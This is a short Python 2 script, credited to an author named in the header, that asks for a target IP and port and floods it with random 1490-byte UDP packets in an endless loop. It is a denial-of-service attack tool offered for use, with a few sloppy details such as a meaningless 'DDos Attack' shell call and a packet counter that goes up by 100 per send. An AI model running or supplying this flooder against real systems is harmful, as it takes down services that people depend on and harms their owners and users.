import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("DDos Attack")
print
print "Author   : UmerMirza"
print "github   : https://github.com/umermirza001"
print "Facebook : https://www.facebook.com/UmerMirza001"
print
ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
print "[====================] 100%"
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 100
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
